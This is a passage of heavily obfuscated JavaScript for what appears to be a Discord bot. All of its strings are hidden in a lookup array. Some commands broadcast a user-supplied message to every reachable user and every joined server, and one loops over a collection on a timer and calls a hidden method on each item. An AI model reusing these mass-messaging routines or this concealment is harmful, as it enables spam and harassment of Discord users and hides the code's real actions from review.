Discord.RichEmbed()[_0xa42d[112]](body[_0xa42d[505]])[_0xa42d[248]](body[_0xa42d[504]])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {let _0x74d2x4f= new Discord.Attachment(body[_0xa42d[504]],_0xa42d[506]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](body[_0xa42d[505]],_0x74d2x4f)}};if(_0x74d2x15=== _0xa42d[507]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[0]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[508])};const _0x74d2x50=[_0xa42d[509],_0xa42d[510]];if(!_0x74d2x50[_0xa42d[92]](_0x74d2x16[0][_0xa42d[511]]())){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[508])};let _0x74d2x1f=_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x1f){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[512])};if(_0x74d2x1f[_0xa42d[196]]> 1024){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[513])};if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x50[0]){const {body}= await superagent[_0xa42d[184]](`${_0xa42d[514]}${_0x74d2x1f}${_0xa42d[20]}`);return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](body[_0xa42d[507]])}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0x74d2x50[1]){const {body}= await superagent[_0xa42d[184]](`${_0xa42d[515]}${_0x74d2x1f}${_0xa42d[20]}`);return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](body[_0xa42d[386]])}}};if(_0x74d2x15=== _0xa42d[516]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[517])};_0x74d2x12[_0xa42d[81]][_0xa42d[387]][_0xa42d[282]]((_0x74d2x51)=>{return _0x74d2x51[_0xa42d[385]]=== _0xa42d[386]})[_0xa42d[310]]((_0x74d2x51)=>{console[_0xa42d[18]](colors[_0xa42d[30]](`${_0xa42d[518]}${_0x74d2x51[_0xa42d[45]]}${_0xa42d[20]}`));_0x74d2x51[_0xa42d[101]](_0x74d2x16[_0xa42d[177]](_0xa42d[23]))[_0xa42d[285]]((_0x74d2x36)=>{return console[_0xa42d[18]](colors[_0xa42d[22]](`${_0xa42d[519]}${_0x74d2x51[_0xa42d[45]]}${_0xa42d[20]}`))})})};if(_0x74d2x15=== _0xa42d[520]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[517])};_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[310]]((_0x74d2x52)=>{try{_0x74d2x52[_0xa42d[101]](_0x74d2x16[_0xa42d[177]](_0xa42d[23]))[_0xa42d[285]]((_0x74d2x36)=>{return console[_0xa42d[18]](colors[_0xa42d[22]](`${_0xa42d[521]}${_0x74d2x52[_0xa42d[53]][_0xa42d[59]]}${_0xa42d[20]}`))});console[_0xa42d[18]](colors[_0xa42d[30]](`${_0xa42d[522]}${_0x74d2x52[_0xa42d[53]][_0xa42d[59]]}${_0xa42d[20]}`))}catch(err){return console[_0xa42d[18]](colors[_0xa42d[22]](`${_0xa42d[521]}${_0x74d2x52[_0xa42d[53]][_0xa42d[59]]}${_0xa42d[20]}`))}})};if(_0x74d2x15=== _0xa42d[523]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[524])};const _0x74d2x28=_0x74d2x12[_0xa42d[86]][_0xa42d[90]](7)[_0xa42d[88]](_0xa42d[408]);let _0x74d2x18= new Discord.RichEmbed();if(_0x74d2x28[0]){_0x74d2x18[_0xa42d[112]](_0x74d2x28[0])};if(_0x74d2x28[1]){_0x74d2x18[_0xa42d[110]](_0x74d2x28[1])};if(_0x74d2x28[2]){_0x74d2x18[_0xa42d[105]](`${_0xa42d[525]}${_0x74d2x28[2]}${_0xa42d[20]}`)};if(_0x74d2x28[3]){_0x74d2x18[_0xa42d[103]](_0x74d2x28[3])};if(_0x74d2x28[5]){_0x74d2x18[_0xa42d[246]](_0x74d2x28[5])};if(_0x74d2x28[6]){_0x74d2x18[_0xa42d[107]](_0x74d2x28[6])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)};if(_0x74d2x15=== _0xa42d[526]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){const _0x74d2x53=stripIndents`${_0xa42d[527]}${_0x74d2x13}${_0xa42d[528]}${_0x74d2x13}${_0xa42d[529]}${_0x74d2x13}${_0xa42d[530]}${_0x74d2x13}${_0xa42d[531]}${_0x74d2x13}${_0xa42d[532]}${_0x74d2x13}${_0xa42d[533]}${_0x74d2x13}${_0xa42d[534]}${_0x74d2x13}${_0xa42d[535]}${_0x74d2x13}${_0xa42d[536]}${_0x74d2x13}${_0xa42d[537]}`;let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[538])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102]);if(_0x74d2x53[_0xa42d[196]]< 2000){_0x74d2x18[_0xa42d[110]](_0x74d2x53)}else {const {body}= await post(_0xa42d[277])[_0xa42d[101]](_0x74d2x53);_0x74d2x18[_0xa42d[110]](`${_0xa42d[539]}${body[_0xa42d[279]]}${_0xa42d[540]}`)};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[541]}${_0x74d2x13}${_0xa42d[542]}${_0x74d2x13}${_0xa42d[543]}${_0x74d2x13}${_0xa42d[544]}${_0x74d2x13}${_0xa42d[545]}${_0x74d2x13}${_0xa42d[546]}${_0x74d2x13}${_0xa42d[547]}${_0x74d2x13}${_0xa42d[548]}${_0x74d2x13}${_0xa42d[549]}${_0x74d2x13}${_0xa42d[550]}${_0x74d2x13}${_0xa42d[551]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[386]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[565])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[552]}${_0x74d2x13}${_0xa42d[553]}${_0x74d2x13}${_0xa42d[554]}${_0x74d2x13}${_0xa42d[555]}${_0x74d2x13}${_0xa42d[556]}${_0x74d2x13}${_0xa42d[557]}${_0x74d2x13}${_0xa42d[558]}${_0x74d2x13}${_0xa42d[559]}${_0x74d2x13}${_0xa42d[560]}${_0x74d2x13}${_0xa42d[561]}${_0x74d2x13}${_0xa42d[562]}${_0x74d2x13}${_0xa42d[563]}${_0x74d2x13}${_0xa42d[564]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[566]}${_0x74d2x13}${_0xa42d[567]}${_0x74d2x13}${_0xa42d[568]}${_0x74d2x13}${_0xa42d[569]}${_0x74d2x13}${_0xa42d[570]}${_0x74d2x13}${_0xa42d[571]}${_0x74d2x13}${_0xa42d[572]}${_0x74d2x13}${_0xa42d[573]}${_0x74d2x13}${_0xa42d[574]}${_0x74d2x13}${_0xa42d[575]}${_0x74d2x13}${_0xa42d[576]}${_0x74d2x13}${_0xa42d[577]}${_0x74d2x13}${_0xa42d[578]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[579]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x31=_0x74d2x16[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x31){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[580])};const _0x74d2x54=_0x74d2x31[_0xa42d[89]](_0xa42d[595],_0xa42d[594])[_0xa42d[89]](_0xa42d[593],_0xa42d[594])[_0xa42d[89]](_0xa42d[592],_0xa42d[591])[_0xa42d[89]](_0xa42d[590],_0xa42d[591])[_0xa42d[89]](_0xa42d[589],_0xa42d[588])[_0xa42d[89]](_0xa42d[587],_0xa42d[588])[_0xa42d[89]](_0xa42d[586],_0xa42d[585])[_0xa42d[89]](_0xa42d[584],_0xa42d[585])[_0xa42d[89]](_0xa42d[583],_0xa42d[582])[_0xa42d[89]](_0xa42d[581],_0xa42d[582]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x54)};if(_0x74d2x15=== _0xa42d[596]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[604])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[552]}${_0x74d2x13}${_0xa42d[597]}${_0x74d2x13}${_0xa42d[598]}${_0x74d2x13}${_0xa42d[599]}${_0x74d2x13}${_0xa42d[600]}${_0x74d2x13}${_0xa42d[601]}${_0x74d2x13}${_0xa42d[602]}${_0x74d2x13}${_0xa42d[603]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[566]}${_0x74d2x13}${_0xa42d[605]}${_0x74d2x13}${_0xa42d[606]}${_0x74d2x13}${_0xa42d[607]}${_0x74d2x13}${_0xa42d[608]}${_0x74d2x13}${_0xa42d[609]}${_0x74d2x13}${_0xa42d[610]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[611]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[623])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[552]}${_0x74d2x13}${_0xa42d[612]}${_0x74d2x13}${_0xa42d[613]}${_0x74d2x13}${_0xa42d[614]}${_0x74d2x13}${_0xa42d[615]}${_0x74d2x13}${_0xa42d[616]}${_0x74d2x13}${_0xa42d[617]}${_0x74d2x13}${_0xa42d[618]}${_0x74d2x13}${_0xa42d[619]}${_0x74d2x13}${_0xa42d[620]}${_0x74d2x13}${_0xa42d[621]}${_0x74d2x13}${_0xa42d[622]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[566]}${_0x74d2x13}${_0xa42d[624]}${_0x74d2x13}${_0xa42d[625]}${_0x74d2x13}${_0xa42d[626]}${_0x74d2x13}${_0xa42d[627]}${_0x74d2x13}${_0xa42d[628]}${_0x74d2x13}${_0xa42d[629]}${_0x74d2x13}${_0xa42d[630]}${_0x74d2x13}${_0xa42d[631]}${_0x74d2x13}${_0xa42d[632]}${_0x74d2x13}${_0xa42d[633]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[634]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[641])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[635]}${_0x74d2x13}${_0xa42d[636]}${_0x74d2x13}${_0xa42d[637]}${_0x74d2x13}${_0xa42d[638]}${_0x74d2x13}${_0xa42d[639]}${_0x74d2x13}${_0xa42d[640]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[642]}${_0x74d2x13}${_0xa42d[643]}${_0x74d2x13}${_0xa42d[644]}${_0x74d2x13}${_0xa42d[645]}${_0x74d2x13}${_0xa42d[646]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[647]}`)}};if(_0x74d2x15=== _0xa42d[648]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[657])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[552]}${_0x74d2x13}${_0xa42d[649]}${_0x74d2x13}${_0xa42d[650]}${_0x74d2x13}${_0xa42d[651]}${_0x74d2x13}${_0xa42d[652]}${_0x74d2x13}${_0xa42d[653]}${_0x74d2x13}${_0xa42d[654]}${_0x74d2x13}${_0xa42d[655]}${_0x74d2x13}${_0xa42d[656]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[658]}${_0x74d2x13}${_0xa42d[659]}${_0x74d2x13}${_0xa42d[660]}${_0x74d2x13}${_0xa42d[661]}${_0x74d2x13}${_0xa42d[662]}${_0x74d2x13}${_0xa42d[663]}${_0x74d2x13}${_0xa42d[664]}${_0x74d2x13}${_0xa42d[665]}${_0x74d2x13}${_0xa42d[666]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[667]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[672])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[552]}${_0x74d2x13}${_0xa42d[668]}${_0x74d2x13}${_0xa42d[669]}${_0x74d2x13}${_0xa42d[670]}${_0x74d2x13}${_0xa42d[671]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[673]}${_0x74d2x13}${_0xa42d[674]}${_0x74d2x13}${_0xa42d[675]}${_0x74d2x13}${_0xa42d[676]}${_0x74d2x13}${_0xa42d[677]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[377]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[684])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[678]}${_0x74d2x13}${_0xa42d[679]}${_0x74d2x13}${_0xa42d[680]}${_0x74d2x13}${_0xa42d[681]}${_0x74d2x13}${_0xa42d[682]}${_0x74d2x13}${_0xa42d[683]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[685]}${_0x74d2x13}${_0xa42d[686]}${_0x74d2x13}${_0xa42d[687]}${_0x74d2x13}${_0xa42d[688]}${_0x74d2x13}${_0xa42d[689]}${_0x74d2x13}${_0xa42d[690]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[647]}`)}};if(_0x74d2x15=== _0xa42d[691]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[695])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[678]}${_0x74d2x13}${_0xa42d[692]}${_0x74d2x13}${_0xa42d[693]}${_0x74d2x13}${_0xa42d[694]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[696]}${_0x74d2x13}${_0xa42d[697]}${_0x74d2x13}${_0xa42d[698]}${_0x74d2x13}${_0xa42d[699]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[647]}`)}};if(_0x74d2x15=== _0xa42d[700]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[714])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[678]}${_0x74d2x13}${_0xa42d[701]}${_0x74d2x13}${_0xa42d[702]}${_0x74d2x13}${_0xa42d[703]}${_0x74d2x13}${_0xa42d[638]}${_0x74d2x13}${_0xa42d[704]}${_0x74d2x13}${_0xa42d[705]}${_0x74d2x13}${_0xa42d[706]}${_0x74d2x13}${_0xa42d[707]}${_0x74d2x13}${_0xa42d[708]}${_0x74d2x13}${_0xa42d[709]}${_0x74d2x13}${_0xa42d[710]}${_0x74d2x13}${_0xa42d[711]}${_0x74d2x13}${_0xa42d[712]}${_0x74d2x13}${_0xa42d[713]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[715]}${_0x74d2x13}${_0xa42d[716]}${_0x74d2x13}${_0xa42d[717]}${_0x74d2x13}${_0xa42d[718]}${_0x74d2x13}${_0xa42d[719]}${_0x74d2x13}${_0xa42d[720]}${_0x74d2x13}${_0xa42d[721]}${_0x74d2x13}${_0xa42d[722]}${_0x74d2x13}${_0xa42d[723]}${_0x74d2x13}${_0xa42d[724]}${_0x74d2x13}${_0xa42d[725]}${_0x74d2x13}${_0xa42d[726]}${_0x74d2x13}${_0xa42d[727]}${_0x74d2x13}${_0xa42d[728]}${_0x74d2x13}${_0xa42d[729]}${_0x74d2x13}${_0xa42d[730]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[647]}`)}};if(_0x74d2x15=== _0xa42d[731]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[740])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[732]}${_0x74d2x13}${_0xa42d[733]}${_0x74d2x13}${_0xa42d[734]}${_0x74d2x13}${_0xa42d[735]}${_0x74d2x13}${_0xa42d[736]}${_0x74d2x13}${_0xa42d[737]}${_0x74d2x13}${_0xa42d[738]}${_0x74d2x13}${_0xa42d[739]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[741]}${_0x74d2x13}${_0xa42d[742]}${_0x74d2x13}${_0xa42d[743]}${_0x74d2x13}${_0xa42d[744]}${_0x74d2x13}${_0xa42d[745]}${_0x74d2x13}${_0xa42d[746]}${_0x74d2x13}${_0xa42d[747]}${_0x74d2x13}${_0xa42d[748]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[749]}`)}};if(_0x74d2x15=== _0xa42d[750]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[757])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[732]}${_0x74d2x13}${_0xa42d[751]}${_0x74d2x13}${_0xa42d[752]}${_0x74d2x13}${_0xa42d[753]}${_0x74d2x13}${_0xa42d[754]}${_0x74d2x13}${_0xa42d[755]}${_0x74d2x13}${_0xa42d[756]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[758]}${_0x74d2x13}${_0xa42d[759]}${_0x74d2x13}${_0xa42d[760]}${_0x74d2x13}${_0xa42d[761]}${_0x74d2x13}${_0xa42d[762]}${_0x74d2x13}${_0xa42d[763]}${_0x74d2x13}${_0xa42d[764]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[749]}`)}};if(_0x74d2x15=== _0xa42d[765]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};bot[_0xa42d[767]][_0xa42d[310]]((_0x74d2x55)=>{_0x74d2x55[_0xa42d[766]]()},3000)};if(_0x74d2x15=== 